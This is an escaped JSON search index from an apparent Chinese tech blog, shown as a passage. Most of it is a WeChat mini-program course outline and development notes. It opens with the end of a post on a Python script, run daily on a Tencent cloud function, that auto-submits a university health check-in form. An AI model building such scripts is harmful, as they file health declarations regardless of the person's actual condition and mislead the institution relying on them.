&#39;https:&#x2F;&#x2F;app.xiaoyuan.ccb.com&#x2F;channelManage&#x2F;outbreak&#x2F;addOutbreak&#39;\n    headers &#x3D; &#123;\n            &#39;Host&#39;: &#39;app.xiaoyuan.ccb.com&#39;,\n            &#39;Connection&#39;: &#39;keep-alive&#39;,\n            &#39;Content-Length&#39;: &#39;1208&#39;,\n            &#39;Accept&#39;: &#39;application&#x2F;json, text&#x2F;plain, *&#x2F;*&#39;,\n            &#x2F;&#x2F;...... 后面同理填\n        &#125;\n    \n    null&#x3D;&#39;&#39;\n    data &#x3D; &#123;&#39;stuClass&#39;:&#39;9999&#39;,&#39;schoolId&#39;:&#39;10530&#39;,&#x2F;&#x2F;...... 后面同理填&#125;\n    data &#x3D; json.dumps(data)\n    res &#x3D; requests.post(url&#x3D;url,data&#x3D;data,headers&#x3D;headers)\n    return res.text\n\ndef main_handler(event, context):\n  return sender()\n\nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n  sender()\n\n注意python的格式\n3.腾讯云云函数部署腾讯云函数：[官网注册并激活]\n新建\n\n名称随便，运行环境python3.6，创建方式空白函数，将写好的py代码复制进index.py，点击完成\n\n在函数管理-函数代码中点测试，\n\n因为上面代码会return res.text，出现下图结果说明ok，还可以去健康信息上报界面验证一下最近一次提交时间\n\n在触发管理点创建触发器，触发周期改为自定义触发周期，名称随意，Cron表达式 \n0 0 6 * * * *\n表示每天的六点定时执行一次，以此类推，另外不建议将时间设为凌晨时间因为可能不算\n\nOK！\n\n参考文章：\n湘大校园-健康信息填报自动打卡\n","slug":"XTU每日打卡","date":"2021-02-03T16:07:00.000Z","categories_index":"","tags_index":"XTU","author_index":"kif"},{"id":"24ecbcefbf717172def84d571b7f09a0","title":"2021C.S.N 冬令营 微信小程序教学提纲","content":"1.资料1接口地址：\nhttps://www.showdoc.cc/128719739414963\n2.postman\nhttps://wwi.lanzous.com/iWb3zkhskje\n3.微信开发官方文档\nhttps://developers.weixin.qq.com/miniprogram/dev/framework/\n4.组件库\nhttps://developers.weixin.qq.com/miniprogram/dev/component/button.html\n5.CSS单位总结（如rem、px、em、vw、vh、vm ）\nhttps://www.php.cn/css-tutorial-411368.html\n6.CSS calc() 函数\nhttps://www.runoob.com/cssref/func-calc.html\n7.JavaScript中的map()函数\nhttps://blog.csdn.net/u010297791/article/details/55511326\n8.CSS3 :nth-last-child() 选择器\nhttps://www.w3school.com.cn/cssref/selector_nth-last-child.asp\n9.JavaScript中避免回调地狱方法\nhttps://andyli.blog.csdn.net/article/details/80742239?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control\n10.JS 把url的参数解析成对象\nhttps://a-jing.blog.csdn.net/article/details/80060315?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-3.control\n2.项目预览\n\n\n\n3.创建项目3.1精简初始文件3.1.1 app.jswx-app\n3.1.2 app.json删除不需要的界面\n修改 navigationBarTitleText\n3.1.3 pages删除不需要的界面；\n修改index（参考2.1.1；2.1.2）；\nindex.js   wx-page\nindex.json  修改 navigationBarTitleText\nindex.wxss 删除内容\n3.2 搭建目录结构\n3.3 搭建项目页面\n常用快捷键：\nctrl +alt +down\n\nshift+end\n\nctrl +v\n\nshift+right\n\n详见：https://www.kifroom.icu/posts/7362.html\n3.4.引入字体图标3.4.1 创建阿里矢量库\nhttps://www.iconfont.cn/\n\n加入到创建的项目\n\n打开在线连接\n\n复制到styles的iconfont.wxss\n3.4.2 导入\n3.4.3 使用\n3.5 搭建项目tabBar3.5.1 图片文件阿里矢量库\n3.5.2. tabBar\n3.6 定义全局变量3.6.1 全局样式文件@import &#39;.&#x2F;styles&#x2F;iconfont.wxss&#39;;\n\npage,view,image,text&#123;\n    bottom: 0;\n    margin: 0;\n    box-sizing: border-box;\n&#125;\npage&#123;\n  &#x2F;* 定义主题颜色 *&#x2F;\n  --themeColor:#e60039;\n\n&#125;\n\n\n\n1px&#x3D; 2rpx\n14px &#x3D; 28rpx\n4.首页\n4.1 搜索框-自定义组件4.1.1 新建组件components文件夹下\n\n4.1.2 引用\n4.1.3 搜索框编辑\n\n\n\n\n\n4.2 轮播图4.2.1 接口数据api:https://www.showdoc.com.cn/128719739414963?page_id=2513235043485226\n\nwx.request\n\n\njs:（此处可以用promise优化）\nonLoad: function (options) &#123;\n  wx - wx.request(&#123;\n    url: &#39;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;api&#x2F;public&#x2F;v1&#x2F;home&#x2F;swiperdata&#39;,\n    header: &#123;\n      &#39;content-type&#39;: &#39;application&#x2F;json&#39; &#x2F;&#x2F; 默认值\n    &#125;,\n    success: (result) &#x3D;&gt; &#123;\n      console.log(result)\n    &#125;,\n    &#x2F;&#x2F; fail: (res) &#x3D;&gt; &#123;&#125;,\n    &#x2F;&#x2F; complete: (res) &#x3D;&gt; &#123;&#125;,\n  &#125;)\n&#125;,\n\n注意：\n坑1：\n\n解决办法1：不校验域名\n\n解决方法2：添加域名到白名单\nhttps://mp.weixin.qq.com/\n\n数据：\n&#123;\n    &quot;message&quot;: [\n        &#123;\n            &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;banner1.png&quot;,\n            &quot;open_type&quot;: &quot;navigate&quot;,\n            &quot;goods_id&quot;: 129,\n            &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_detail&#x2F;index?goods_id&#x3D;129&quot;\n        &#125;\n    ],\n    &quot;meta&quot;: &#123;\n        &quot;msg&quot;: &quot;获取成功&quot;,\n        &quot;status&quot;: 200\n    &#125;\n&#125;\n\n\n\n4.2.2 数据绑定&lt;!-- 轮播图开始 --&gt;\n &lt;view class&#x3D;&quot;swiper_view&quot;&gt;\n   &lt;swiper&gt;\n     &lt;swiper-item wx:for&#x3D;&quot;&#123;&#123;swiperList&#125;&#125;&quot; wx:key&#x3D;&quot;goods_id&quot;&gt;\n       &lt;navigator&gt;\n         &lt;image src&#x3D;&quot;&#123;&#123;item.image_src&#125;&#125;&quot;&gt;\n         &lt;&#x2F;image&gt;\n       &lt;&#x2F;navigator&gt;\n     &lt;&#x2F;swiper-item&gt;\n   &lt;&#x2F;swiper&gt;\n &lt;&#x2F;view&gt;\n &lt;!-- 轮播图结束 --&gt;\n\n\n4.2.3 布局优化1.图片标签mode属性渲染模式 \nwidthFix：让图片的标签宽高和图片标签的内容的宽高都等比例的发生变化\n2.swiper标签存在默认的宽度和高度100% * 150px\n\n解决办法\n让swiper高度与图片一样\n3.swiper属性\n\n4.3 导航4.3.1 接口数据api接口:https://api-hmugo-web.itheima.net/api/public/v1/home/catitems\njs:gettabBarlist()\n &#123;\n   wx-wx.request(&#123;\n     url: &#39;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;api&#x2F;public&#x2F;v1&#x2F;home&#x2F;catitems&#39;,\n     success: (result) &#x3D;&gt; &#123;\n       console.log(result.data.message);\n       this.setData(&#123;\n         castList:result.data.message\n       &#125;)\n     &#125;,\n     fail: (res) &#x3D;&gt; &#123;&#125;,\n     complete: (res) &#x3D;&gt; &#123;&#125;,\n   &#125;)\n &#125;,\n\n\n\n数据：&#123;\n    &quot;message&quot;: [\n        &#123;\n            &quot;name&quot;: &quot;分类&quot;,\n            &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;icon_index_nav_4@2x.png&quot;,\n            &quot;open_type&quot;: &quot;switchTab&quot;,\n            &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;category&#x2F;main&quot;\n        &#125;,\n        &#123;\n            &quot;name&quot;: &quot;秒杀拍&quot;,\n            &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;icon_index_nav_3@2x.png&quot;\n        &#125;,\n        &#123;\n            &quot;name&quot;: &quot;超市购&quot;,\n            &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;icon_index_nav_2@2x.png&quot;\n        &#125;,\n        &#123;\n            &quot;name&quot;: &quot;母婴品&quot;,\n            &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;icon_index_nav_1@2x.png&quot;\n        &#125;\n    ],\n    &quot;meta&quot;: &#123;\n        &quot;msg&quot;: &quot;获取成功&quot;,\n        &quot;status&quot;: 200\n    &#125;\n&#125;\n\n4.3.2  数据绑定&lt;!-- 导航开始 --&gt;\n &lt;view class&#x3D;&quot;navView&quot;&gt;\n   &lt;navigator class&#x3D;&quot;nav&quot; wx:for&#x3D;&quot;&#123;&#123;castList&#125;&#125;&quot; wx:key&#x3D;&quot;name&quot;&gt;\n     &lt;image mode&#x3D;&quot;widthFix&quot; class&#x3D;&quot;navimg&quot; src&#x3D;&quot;&#123;&#123;item.image_src&#125;&#125;&quot;&gt;&lt;&#x2F;image&gt;\n   &lt;&#x2F;navigator&gt;\n &lt;&#x2F;view&gt;\n &lt;!-- 导航结束 --&gt;\n\ncss\n.navView\n&#123;\n  width: 100%;\n  display: flex;\n&#125;\n.nav&#123;\n  padding: 20rpx;\n  flex:1;\n&#125;\n.navimg\n&#123;\n  width: 100%;\n&#125;\n\n课后作业1\n1.Javascript this关键字：\n面向对象语言中 this 表示当前对象的一个引用。\n但在 JavaScript 中 this 不是固定不变的，它会随着执行环境的改变而改变。\nhttps://www.runoob.com/js/js-this.html\n2.css display:flex 属性\n4.4 楼层嵌套循环\n4.4.1 接口数据api:https://api-hmugo-web.itheima.net/api/public/v1/home/floordata\njs:getgoodsdata() &#123;\n  wx - wx.request(&#123;\n    url: &#39;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;api&#x2F;public&#x2F;v1&#x2F;home&#x2F;floordata&#39;,\n    success: (result) &#x3D;&gt; &#123;\n      this.setData(&#123;\n        goodsList:result.data.message\n      &#125;)\n    &#125;,\n    fail: (res) &#x3D;&gt; &#123;&#125;,\n    complete: (res) &#x3D;&gt; &#123;&#125;,\n  &#125;)\n&#125;,\n\n\n\n数据：&#123;\n    &quot;message&quot;: [\n        &#123;\n            &quot;floor_title&quot;: &#123;\n                &quot;name&quot;: &quot;时尚女装&quot;,\n                &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor01_title.png&quot;\n            &#125;,\n            &quot;product_list&quot;: [\n                &#123;\n                    &quot;name&quot;: &quot;优质服饰&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor01_1@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;232&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;服饰&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;春季热门&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor01_2@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;233&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;热&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;爆款清仓&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor01_3@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;233&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;爆款&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;倒春寒&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor01_4@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;233&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;春季&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;怦然心动&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor01_5@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;233&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;心动&quot;\n                &#125;\n            ]\n        &#125;,\n        &#123;\n            &quot;floor_title&quot;: &#123;\n                &quot;name&quot;: &quot;户外活动&quot;,\n                &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor02_title.png&quot;\n            &#125;,\n            &quot;product_list&quot;: [\n                &#123;\n                    &quot;name&quot;: &quot;勇往直前&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor02_1@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;232&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;户外&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;户外登山包&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor02_2@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;273&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;登山包&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;超强手套&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor02_3@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;193&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;手套&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;户外运动鞋&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor02_4@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;193&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;运动鞋&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;冲锋衣系列&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor02_5@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;273&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;冲锋衣&quot;\n                &#125;\n            ]\n        &#125;,\n        &#123;\n            &quot;floor_title&quot;: &#123;\n                &quot;name&quot;: &quot;箱包配饰&quot;,\n                &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor03_title.png&quot;\n            &#125;,\n            &quot;product_list&quot;: [\n                &#123;\n                    &quot;name&quot;: &quot;清新气质&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor03_1@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;232&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;饰品&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;复古胸针&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor03_2@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;263&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;胸针&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;韩版手链&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor03_3@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;203&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;手链&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;水晶项链&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor03_4@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;193&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;水晶项链&quot;\n                &#125;,\n                &#123;\n                    &quot;name&quot;: &quot;情侣表&quot;,\n                    &quot;image_src&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;pyg&#x2F;pic_floor03_5@2x.png&quot;,\n                    &quot;image_width&quot;: &quot;273&quot;,\n                    &quot;open_type&quot;: &quot;navigate&quot;,\n                    &quot;navigator_url&quot;: &quot;&#x2F;pages&#x2F;goods_list?query&#x3D;情侣表&quot;\n                &#125;\n            ]\n        &#125;\n    ],\n    &quot;meta&quot;: &#123;\n        &quot;msg&quot;: &quot;获取成功&quot;,\n        &quot;status&quot;: 200\n    &#125;\n&#125;\n\n\n\n4.4.2 数据绑定\nmode&#x3D;”widthFix”图片等比例缩放\n\n\n解决：第一张图片原图的宽高：232 * 386232 / 386 = 33.33vw / height\n第一张图片的高度：height：33.33vw * 386 / 232后四个超链接图片的高度：height：33.33vw * 386 / 232 / 2后四张图片的高度应该跟随写好的样式：image标签的mode属性应改为mode=&quot;&#123;&#123;index2===0?'widthFix':'scaleToFill'&#125;&#125;\nwx:if\nindex2&#x3D;&#x3D;0\n\n三元表达式\n&lt;!-- 商品数据开始 --&gt;\n&lt;view class&#x3D;&quot;data&quot;&gt;\n  &lt;view class&#x3D;&quot;group&quot; wx:for&#x3D;&quot;&#123;&#123;goodsList&#125;&#125;&quot; wx:for-item&#x3D;&quot;item1&quot;&gt;\n    &lt;view class&#x3D;&quot;title&quot;&gt;\n      &lt;image mode&#x3D;&quot;widthFix&quot; class&#x3D;&quot;titleImg&quot; mode&#x3D;&quot;widthFix&quot; src&#x3D;&quot;&#123;&#123;item1.floor_title.image_src&#125;&#125;&quot;&gt;&lt;&#x2F;image&gt;\n    &lt;&#x2F;view&gt;\n    &lt;view class&#x3D;&quot;list&quot;&gt;\n     &lt;navigator class&#x3D;&quot;goodsNav&quot; wx:for&#x3D;&quot;&#123;&#123;item1.product_list&#125;&#125;&quot; \n     wx:for-item&#x3D;&quot;item2&quot; \n     wx:for-index&#x3D;&quot;index2&quot;\n     wx:key&#x3D;&quot;name&quot;&gt;\n     &lt;image class&#x3D;&quot;goodsImg&quot; mode&#x3D;&quot;&#123;&#123;index2&#x3D;&#x3D;&#x3D;0?&#39;widthFix&#39;:&#39;scaleToFill&#39;&#125;&#125;&quot; src&#x3D;&quot;&#123;&#123;item2.image_src&#125;&#125;&quot;&gt;&lt;&#x2F;image&gt;\n     &lt;&#x2F;navigator&gt;\n    &lt;&#x2F;view&gt;\n  &lt;&#x2F;view&gt;\n&lt;&#x2F;view&gt;\n&lt;!-- 商品数据结束 --&gt;\n\n\n\n.titleImg &#123;\n  width: 100%;\n&#125;\n.goodsNav\n&#123;\nfloat: left;\nwidth: 33.33333%;\n&#125;\n\n&#x2F;* \n232&#x2F;386&#x3D;33.3vw &#x2F; heigh\nheigt &#x3D; 386*33.3vw&#x2F;232\n*&#x2F;\n.goodsNav:nth-last-child(-n+4)\n&#123;\n  &#x2F;* height:  386*33.3vw&#x2F;232&#x2F;2; *&#x2F;\n  height: 27.702155172413vw;\n&#125;\n.goodsImg\n&#123;\n  width: 100%;\n  height: 100%;\n&#125;\n\n\n5 分类5.1 预览\n5.2 接口数据api:\nhttps://api-hmugo-web.itheima.net/api/public/v1/categories\n\n数据映射\n\n&#123;\n    &quot;message&quot;: [\n        &#123;\n            &quot;cat_id&quot;: 1,\n            &quot;cat_name&quot;: &quot;大家电&quot;,\n            &quot;cat_pid&quot;: 0,\n            &quot;cat_level&quot;: 0,\n            &quot;cat_deleted&quot;: false,\n            &quot;cat_icon&quot;: &quot;&#x2F;full&#x2F;none.jpg&quot;,\n            &quot;children&quot;: [\n                &#123;\n                    &quot;cat_id&quot;: 3,\n                    &quot;cat_name&quot;: &quot;电视&quot;,\n                    &quot;cat_pid&quot;: 1,\n                    &quot;cat_level&quot;: 1,\n                    &quot;cat_deleted&quot;: false,\n                    &quot;cat_icon&quot;: &quot;&#x2F;full&#x2F;none.jpg&quot;,\n                    &quot;children&quot;: [\n                        &#123;\n                            &quot;cat_id&quot;: 5,\n                            &quot;cat_name&quot;: &quot;曲面电视&quot;,\n                            &quot;cat_pid&quot;: 3,\n                            &quot;cat_level&quot;: 2,\n                            &quot;cat_deleted&quot;: false,\n                            &quot;cat_icon&quot;: &quot;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;full&#x2F;2fb113b32f7a2b161f5ee4096c319afedc3fd5a1.jpg&quot;\n                        &#125;\n                    ]\n                &#125;\n            ]\n        &#125;\n    ],\n    &quot;meta&quot;: &#123;\n        &quot;msg&quot;: &quot;获取成功&quot;,\n        &quot;status&quot;: 200\n    &#125;\n&#125;\n\n\n\n数据拆分左侧名称leftmenulist\nrightContent\n&#x2F;&#x2F; pages&#x2F;category&#x2F;category.js\nPage(&#123;\n\n  &#x2F;**\n   * 页面的初始数据\n   *&#x2F;\n  data: &#123;\n    leftmenulist: [],\n    rightContent: [],\n  &#125;,\n  cases: [],\n  &#x2F;**\n   * 生命周期函数--监听页面加载\n   *&#x2F;\n  onLoad: function (options) &#123;\n    this.getdataList();\n  &#125;,\n  getdataList() &#123;\n    wx - wx.request(&#123;\n      url: &#39;https:&#x2F;&#x2F;api-hmugo-web.itheima.net&#x2F;api&#x2F;public&#x2F;v1&#x2F;categories&#39;,\n      success: (result) &#x3D;&gt; &#123;\n        this.cases &#x3D; result.data.message\n        console.log(this.cases);\n        &#x2F;&#x2F; 左侧\n        let list &#x3D; this.cases.map(\n          function (item) &#123;\n          return item.cat_name;\n        &#125;);\n        let list2&#x3D;this.cases[0].children\n        console.log(list2)\n        this.setData(&#123;\n          leftmenulist:list,\n          rightContent:list2,\n        &#125;)\n      &#125;,\n\n    &#125;)\n  &#125;\n&#125;)\n\nmap函数\n\n5.3 界面5.3.1 引入搜索框json:&#123;\n  &quot;usingComponents&quot;: &#123;\n    &quot;searchInput&quot;:&quot;..&#x2F;..&#x2F;components&#x2F;searchInput&#x2F;searchInput&quot;\n  &#125;,\n  &quot;navigationBarTitleText&quot;: &quot;分类&quot;\n&#125;\n\n\n\n\n\n\n5.3.2 左右可滚动视图区域组件：\nscroll-view\n\n&#x2F;* pages&#x2F;category&#x2F;category.wxss *&#x2F;\npage &#123;\n  height: 100%;\n&#125;\n.mainView\n&#123;\n  height: 100%;\n&#125;\n\n.cates_container ,mainView  &#123;\n  height: calc(100vh - 45px);\n  display: flex;\n&#125;\n\n.left_menu &#123;\n  background-color: bisque;\n  flex: 2;\n\n\n&#125;\n\n.right_content &#123;\n  background-color: blue;\n  flex: 5;\n\n&#125;\n\n height: calc(100vh - 45px);\n空格！\n6.优化6.1  缓存技术目的：优化减少请求次数\n思路：\n\n6.1.1本地存储本地数据缓存\n本地数据缓存是小程序存储在当前设备上硬盘上的数据，本地数据缓存有非常多的用途，我们可以利用本地数据缓存来存储用户在小程序上产生的操作，在用户关闭小程序重新打开时可以恢复之前的状态。我们还可以利用本地缓存一些服务端非实时的数据提高小程序获取数据的速度，在特定的场景下可以提高页面的渲染速度，减少用户的等待时间。\n读取本地数据缓存\n wx.getStorage&#x2F;wx.getStorageSync\n详细参数\n\n\n\n参数名\n类型\n必填\n描述\n\n\n\nkey\nString\n是\n本地缓存中指定的 key\n\n\nsuccess\nFunction\n否\n异步接口调用成功的回调函数，回调参数格式: {data: key对应的内容}\n\n\nfail\nFunction\n否\n异步接口调用失败的回调函数\n\n\ncomplete\nFunction\n否\n异步接口调用结束的回调函数（调用成功、失败都会执行）\n\n\n写入本地数据缓存\nwx.setStorage&#x2F;wx.setStorageSync\n详细参数\n\n\n\n参数名\n类型\n必填\n描述\n\n\n\nkey\nString\n是\n本地缓存中指定的 key\n\n\ndata\nObject&#x2F;String\n是\n需要存储的内容\n\n\nsuccess\nFunction\n否\n异步接口调用成功的回调函数\n\n\nfail\nFunction\n否\n异步接口调用失败的回调函数\n\n\ncomplete\nFunction\n否\n异步接口调用结束的回调函数（调用成功、失败都会执行）\n\n\nconst Cates &#x3D; wx.getStorageSync(&quot;cates&quot;);\n    if (!Cates) &#123;\n      this.getdataList();\n    &#125;\n    else&#123;\n      if((Date.now()-Cates.time)&gt;1000*100)\n      &#123;\n        this.getdataList();\n      &#125;\n      else&#123;\n        this.cases &#x3D;Cates.data;\n        let list &#x3D; this.cases.map(\n          function (item) &#123;\n            return item.cat_name;\n          &#125;);\n        let list2 &#x3D; this.cases[0].children\n\n        this.setData(&#123;\n          leftmenulist: list,\n          rightContent: list2,\n        &#125;)\n      &#125;\n    &#125;\n\n\n\n6.2 列表回顶scroll-view scroll-top属性\n\n6.3 数据请求优化6.3.1 更改为promise方式原因：避免回调地狱（解决多层回调的问题）\nES6 promise\nPromise 对象就是为了解决这个问题而提出的。它不是新的语法功能，而是一种新的写法，允许将回调函数的嵌套，改成链式调用。\npromise只有两个状态resolve和reject，当它触发任何一个状态后，它会将当前的值缓存起来，并在有回调函数添加进来的时候尝试调用回调函数，如果这个时候还没有触发resolve或者reject，那么回调函数会被缓存，等待调用，如果已经有了状态(resolve或者reject)，则立刻调用回调函数。并且所有回调函数在执行后都立即被销毁。\nNew Promise( function(resolve, reject) &#123;...&#125; &#x2F;* executor *&#x2F;  );1\n\nexecutor是带有 resolve 和 reject 两个参数的函数 。Promise构造函数执行时立即调用executor 函数， resolve 和 reject 两个函数作为参数传递给executor（executor 函数在Promise构造函数返回新建对象前被调用）。resolve 和 reject 函数被调用时，分别将promise的状态改为fulfilled（完成）或rejected（失败）。executor 内部通常会执行一些异步操作，一旦完成，可以调用resolve函数来将promise状态改成fulfilled，或者在发生错误时将它的状态改为rejected。\nJS 把url的参数解析成对象\n...params\n\n等价于：\n&#x2F;&#x2F; url参数解析\nfunction getUrlkey(url) &#123;\n  var params &#x3D; &#123;&#125;;\n  var urls &#x3D; url.split(&quot;?&quot;);                  console.log(&#39;1_分割url:&#39;, urls)\n  var arr &#x3D; urls[1].split(&quot;&amp;&quot;);               console.log(&#39;2_分割urls[1]:&#39;, arr)\n  for (var i &#x3D; 0, l &#x3D; arr.length; i &lt; l; i++) &#123;\n    var a &#x3D; arr[i].split(&quot;&#x3D;&quot;);                console.log(&#39;3_遍历 arr 并分割后赋值给a:&#39;, a[0], a[1])\n    params[a[0]] &#x3D; a[1];                      console.log(&#39;4_a给params对象赋值:&#39;, params)\n  &#125;                                           console.log(&#39;5_结果:&#39;, params)\n  return params;\n&#125;\n\n\neg:       http&#x2F;&#x2F;aaa&#x2F;txt.php?a&#x3D;1&amp;b&#x3D;2&amp;c&#x3D;3\n\n","slug":"2021C-S-N-冬令营-微信小程序教学提纲","date":"2021-01-18T05:43:00.000Z","categories_index":"学习笔记,提纲","tags_index":"C.S.N,微信小程序","author_index":"kif"},{"id":"3e7ce6d43f68f0f7c89b0717b8394e60","title":"微信小程序开发笔记","content":"1.跳转方式&#x2F;&#x2F;只能跳转到tabBar配置页面\nwx.switchTab(&#123;\n  url: &#39;&#x2F;pages&#x2F;index&#x2F;index&#39;,\n&#125;);\n\n&#x2F;&#x2F;返回上一级页面（delta：返回的页面数，如果 delta 大于现有页面数，则返回到首页，默认值为1）\nwx.navigateBack(&#123;\n  delta: 2\n&#125;)\n\n&#x2F;&#x2F;关闭当前页面，跳转到应用内的某个页面\nwx.redirectTo(&#123;\n  url: &#39;&#x2F;pages&#x2F;index&#x2F;index&#39;,\n&#125;);\n\n&#x2F;&#x2F;保留当前页面，跳转到应用内的某个页面\nwx.navigateTo(&#123;\n  url: &#39;&#x2F;pages&#x2F;index&#x2F;index&#39;,\n&#125;);\n\n&#x2F;&#x2F; 关闭所有页面，打开到应用内的某个页面\nwx.reLaunch(&#123;\n  url: 